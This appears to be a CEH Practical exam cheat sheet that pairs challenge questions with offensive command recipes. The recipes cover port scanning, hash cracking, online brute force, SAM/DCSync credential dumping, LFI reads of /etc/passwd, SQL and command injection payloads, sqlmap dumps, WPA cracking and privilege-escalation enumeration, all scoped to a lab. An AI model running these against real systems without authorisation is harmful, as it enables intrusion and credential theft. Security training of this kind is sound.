# CEH Practical — Challenge Playbooks

> The Practical asks a **specific question** per challenge; each maps to a repeatable recipe. Read the question, match it to a pattern below, run the recipe, read the answer off the output. All commands target **your own lab / the exam range only**. Set `T=<target-ip>` first to keep it fast. Deeper technique: [`../resources/deep-references.md`](../resources/deep-references.md).

> **The meta-rule:** the question usually names the artifact (a password, version, file, flag) *and* hints the technique. Don't over-think — pattern-match and execute.

---

## "What OS / open ports / service version / FQDN is host X?"
```bash
nmap -sn 192.168.56.0/24                 # find hosts (if given a range)
sudo nmap -sS -p- --min-rate 2000 $T -oA t   # all ports fast
sudo nmap -sV -sC -O -p <open> $T            # versions + OS + scripts
nmap --script smb-os-discovery -p445 $T      # FQDN/OS via SMB
```
**Answer** = read the exact `Service`/`Version`/`OS details`/hostname string. Watch exact wording (e.g., `Apache httpd 2.4.49`).

## "What is the password of user X?" / "Crack the hash"
```bash
hashid '<hash>'                              # 1) identify the type
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=<fmt> hash.txt --wordlist=/usr/share/wordlists/rockyou.txt ; john --show hash.txt
# online against a live service:
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$T -t 4 -f
```
Common modes: `0` MD5 · `100` SHA1 · `1000` NTLM · `1800` sha512crypt(`$6$`) · `3200` bcrypt(`$2`) · `5600` NetNTLMv2 · `13100` Kerberos · `22000` WPA. **Answer** = the cracked plaintext.

## "What is the NTLM / password hash of user X?"
```bash
# from a foothold / with creds:
impacket-secretsdump <domain>/<user>:'<pw>'@$T          # SAM + domain (DCSync)
# in Meterpreter:  hashdump   |   load kiwi ; lsa_dump_sam
```
**Answer** = the hash string (often the NT half after the `:`).

## "Read the contents of / find the flag in file Z"
Try, in order of what the box exposes:
```bash
# LFI / path traversal on a web param:
curl "http://$T/index.php?page=../../../../etc/passwd"
# SQLi file read (MySQL):  ... UNION SELECT LOAD_FILE('/path'),2 -- -
# command injection:       127.0.0.1; cat /flag
# after a shell:           find / -name 'flag*' 2>/dev/null ; cat /root/flag.txt
```
**Answer** = the file contents / flag string exactly.

## "Which database / table / what is value V?" (SQL injection)
```bash
# manual: detect ' , count cols (ORDER BY n), UNION, then dump:
#   1' UNION SELECT user,password FROM users -- -
# automated:
sqlmap -u "http://$T/vuln.php?id=1" --batch --dbs
sqlmap -u "http://$T/vuln.php?id=1" --batch -D <db> -T <table> -C <col> --dump
```
**Answer** = the extracted value (crack it further if it's a hash).

## "What is hidden in this image / file?" (steganography & files)
```bash
file secret.jpg ; exiftool secret.jpg           # metadata / type
strings -n 6 secret.jpg | less                   # plain hidden text
steghide extract -sf secret.jpg                  # asks a passphrase (try blank/known)
binwalk -e firmware.bin                          # carve embedded files
zsteg secret.png                                 # LSB stego in PNG
foremost -i disk.img                             # recover files
```
Also try `stegsnow` (whitespace), `outguess`, and **CyberChef** for layered encodings. **Answer** = the revealed message/flag.

## "Extract the password / file / data from this packet capture"
```bash
# GUI: Wireshark -> right-click a packet -> Follow -> TCP Stream; File -> Export Objects (HTTP/SMB)
tshark -r cap.pcap -Y 'ftp.request.command=="PASS"' -T fields -e ftp.request.arg
tshark -r cap.pcap -Y 'http.request.method=="POST"'          # form creds
# NetworkMiner (GUI) auto-extracts files/creds from a pcap
```
**Answer** = the cleartext credential / carved file contents. (For a NetNTLM hash in the pcap → crack with `hashcat -m 5600`.)

## "What is the Wi-Fi passphrase?" (given a capture, or your own AP)
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap    # needs a captured handshake
# or convert + GPU crack:
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
**Answer** = the recovered PSK.

## "Identify / decode / decrypt this string"
```bash
echo 'aGVsbG8=' | base64 -d          # base64
echo '68656c6c6f' | xxd -r -p         # hex
# ROT13:  tr 'A-Za-z' 'N-ZA-Mn-za-m'
hashid '<string>'                     # is it a hash?
openssl enc -d -aes-256-cbc -in f.enc -k <key>   # symmetric decrypt with a key
gpg --decrypt msg.gpg                 # if you have the private key
```
Use **CyberChef** (https://gchq.github.io/CyberChef/) for stacked/unknown encodings — "Magic" auto-detects. **Answer** = the decoded plaintext.

## "Get a shell / what user / read a file on host X" (exploitation)
```bash
searchsploit <service> <version>      # find a public exploit
msfconsole -q -x "search <service>"   # or a Metasploit module: use/set RHOSTS/check/run
# then escalate (see privesc below) and read the target file.
```

## "Escalate privileges / become root/SYSTEM"
```bash
# Linux:
sudo -l ; find / -perm -4000 -type f 2>/dev/null ; ./linpeas.sh
# Windows:
whoami /priv ; .\winpeas.exe        # Meterpreter: getsystem ; run local_exploit_suggester
```
**Answer** = usually a file readable only as root/SYSTEM (`/root/...`, an admin's desktop flag).

## "Enumerate this service — what user/share/version?"
```bash
nxc smb $T -u '' -p '' --shares --users        # SMB
smbclient -L //$T -N ; smbclient //$T/<share> -N
snmpwalk -v2c -c public $T                       # SNMP
ftp $T  (anonymous)                              # FTP anon
```
**Answer** = the exact share/user/version string requested.

---

## Fast question→recipe lookup

| The question contains… | Go to |
|---|---|
| "password of", "crack", "hash of" | crack / secretsdump recipes |
| "OS", "version", "FQDN", "open port" | nmap recipe |
| "contents of file", "flag", "read" | file-read / privesc recipes |
| "database", "table", value from a web param | SQLi recipe |
| "hidden", image/audio/pdf attachment | steganography recipe |
| ".pcap", "capture", "traffic" | pcap recipe |
| "Wi-Fi", "WPA", "passphrase", ".cap" | wireless recipe |
| "decode", "decrypt", weird string | encoding/crypto recipe |
| "shell", "gain access", "compromise" | exploitation + privesc |
| "share", "users", "enumerate" | enumeration recipe |

> Keep this file open in the exam. It turns a 6-hour scramble into pattern-match → run → read the answer.
